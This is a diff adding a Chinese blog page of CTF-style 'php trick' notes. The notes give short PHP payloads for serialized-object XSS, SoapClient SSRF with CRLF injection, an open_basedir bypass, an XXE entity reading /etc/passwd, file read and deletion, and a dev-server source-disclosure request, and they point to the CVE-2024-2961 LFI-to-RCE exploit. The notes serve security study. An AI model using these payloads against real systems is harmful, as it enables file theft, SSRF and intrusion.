@@ -1,0 +1,863 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="dddkia">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="php trick">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php trick">
+<meta property="og:url" content="http://example.com/2024/09/08/php_trick/index.html">
+<meta property="og:site_name" content="dddkia">
+<meta property="og:description" content="php trick">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/background/fj_img/37.jpg">
+<meta property="article:published_time" content="2024-09-08T04:13:13.000Z">
+<meta property="article:modified_time" content="2024-09-17T14:40:44.860Z">
+<meta property="article:author" content="dddkia">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/background/fj_img/37.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>php trick - dddkia</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"41fc030db57d5570dd22f78997dc4a7e","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>dddkia</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background/fj_img/37.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="php trick"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        dddkia
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-08 12:13" pubdate>
+          2024年9月8日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">php trick</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="php-trick">php trick</h1>
+<h2 id="常用原生类">常用原生类</h2>
+<h3 id="errorexception-xss"><strong>Error/Exception xss</strong></h3>
+<p>Error适用于php7、Exception适用于php5/7</p>
+<p>开启报错的情况下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#demo</span><br><span class="hljs-variable">$test</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>;<br><br><span class="hljs-comment">#Error exp</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>); <br><br><span class="hljs-comment">#Exception exp</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>例题：[BJDCTF 2nd]xss之光</p>
+<h3
+id="errorexception绕反序列化md5比较"><strong>Error/Exception绕反序列化md5比较</strong></h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure>
+<p>例题：[2020 极客大挑战]Greatphp</p>
+<h3 id="soapclient">SoapClient</h3>
+<p>常用于SSRF/SSRF+CRLF</p>
+<p>调用不存在的方法触发_call方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$Client</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1:9999/flag.txt&#x27;</span>));<br><span class="hljs-variable">$Client</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><br><span class="hljs-comment">#CRLF插入Cookie头</span><br><span class="hljs-variable">$client</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1:9999/flag.txt&#x27;</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;123\r\nCookie: PHPSESSID=123&#x27;</span>));<br><span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br></code></pre></td></tr></table></figure>
+<p>例题：ctfshow web259</p>
+<h3
+id="directoryiteratorglobiteratorfilesystemiterator">DirectoryIterator、GlobIterator、FilesystemIterator</h3>
+<p>多用于目录遍历</p>
+<p>配合glob协议可以绕过open_basedir</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$Iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>);<br><span class="hljs-comment">//$Iterator = new GlobIterator(&#x27;glob:///*&#x27;);</span><br><span class="hljs-comment">//$Iterator = new FilesystemIterator(&#x27;glob:///*&#x27;);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Iterator</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="simplexmlelement">SimpleXMLElement</h3>
+<p>多用于XXE</p>
+<p>PHP 5/7/8</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">&lt;?xml version = &quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE ANY [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br><span class="hljs-string">EOF</span>;<br><span class="hljs-variable">$XMLElement</span>= <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$xml</span>,LIBXML_NOENT);<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$XMLElement</span>);<br></code></pre></td></tr></table></figure>
+<p>例题：[SUCTF 2018]Homework</p>
+<h3 id="splfileobject">SplFileObject</h3>
+<p>关键找到触发__toSting方法的地方</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#SplFileObject exp</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure>
+<h3 id="ziparchive"><strong>ZipArchive</strong></h3>
+<p>open方法可以删除文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$Archive</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br><span class="hljs-variable">$Archive</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">OVERWRITE</span>);<br></code></pre></td></tr></table></figure>
+<p>例题：NepCTF2021 梦里花开牡丹亭</p>
+<h2 id="php源码泄漏">php源码泄漏</h2>
+<p>https://blog.projectdiscovery.io/php-http-server-source-disclosure/</p>
+<p>PHP Development Server &lt;= 7.4.21</p>
+<p><code>php -S</code>内置服务器启动</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP">GET /phpinfo.php HTTP/<span class="hljs-number">1.1</span> <br>Host: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>\r\n<br>\r\n<br>GET / HTTP/<span class="hljs-number">1.1</span><br>\r\n<br>\r\n<br></code></pre></td></tr></table></figure>
+<h2 id="filters_chain_oracle">filters_chain_oracle</h2>
+<blockquote>
+<p>PHP filters can also be used to read local files when their content
+is not printed</p>
+</blockquote>
+<p>没有打印的情况下读取任意文件</p>
+<p>常见函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">sha1_file</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;/tmp/test&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<p>限制：</p>
+<ol type="1">
+<li>GET请求和header max_size</li>
+<li>使用了<code>file_exists</code> 或 <code>is_file</code>
+等不支持filter的函数</li>
+</ol>
+<p>脚本：https://github.com/synacktiv/php_filter_chains_oracle_exploit</p>
+<p>https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle</p>
+<h2 id="lfi_to_rce">LFI_to_RCE</h2>
+<p>CVE-2024-2961</p>
+<p>GLIBC中iconv库的漏洞</p>
+<p><code>iconv</code>在转换为<code>ISO-2022-CN-EXT</code>字符集时会产生缓冲区溢出</p>
+<p>而在linux中，php将一个字符集转换为另一个字符集使用的是<code>iconv()</code></p>
+<p><code>php://filter</code>的<code>convert.iconv</code>也是使用了<code>iconv()</code></p>
+<p>具体溢出处理原理可以看作者原文</p>
+<p>https://www.ambionics.io/blog/iconv-cve-2024-2961-p1</p>
+<ol type="1">
+<li>读取<code>/proc/self/maps</code>绕过ASLR和PIE</li>
+<li>根据maps算出php堆的地址和libc库的文件名</li>
+<li>libc算出<code>system()</code>函数地址</li>
+<li>缓冲区溢出rce</li>
+</ol>
+<p>影响函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PHP">file_get_contents<br>file<br>readfile<br>fgets<br>getimagesize<br><span class="hljs-built_in">SplFileObject</span>-&gt;read<br>file_put_contents<br>SoapClient-&gt;__construct<br>SimpleXMLElement-&gt;__construct<br>Imagick-&gt;__construct<br></code></pre></td></tr></table></figure>
+<h2 id="各种绕过trick">各种绕过trick</h2>
+<p>https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</p>
+<h2 id="pearcmd">pearcmd</h2>
+<p>https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</p>
+<p>https://tttang.com/archive/1312/</p>
+<h2 id="pcre回溯次数">PCRE回溯次数</h2>
+<p>https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html#0x03-phppcrebacktrack_limit</p>
+<h2 id="preg_replace-e代码执行"><strong>preg_replace</strong>
+<strong>/e代码执行</strong></h2>
+<p>https://xz.aliyun.com/t/2557</p>
+<h2 id="待补充...">待补充...</h2>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web/" class="category-chain-item">web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+        <a href="/tags/php/" class="print-no-link">#php</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>php trick</div>
+      <div>http://example.com/2024/09/08/php_trick/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>dddkia</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/13/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B/" title="第三届广东省大学生网络攻防竞赛">
+                        <span class="hidden-mobile">第三届广东省大学生网络攻防竞赛</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
